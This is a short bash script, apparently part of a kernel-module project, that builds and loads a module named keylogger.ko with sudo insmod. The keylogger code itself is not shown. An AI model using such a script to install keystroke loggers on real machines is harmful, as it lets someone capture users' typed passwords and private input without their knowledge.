#!/bin/bash

echo "Inserting Keylogger module"
make
sudo insmod keylogger.ko
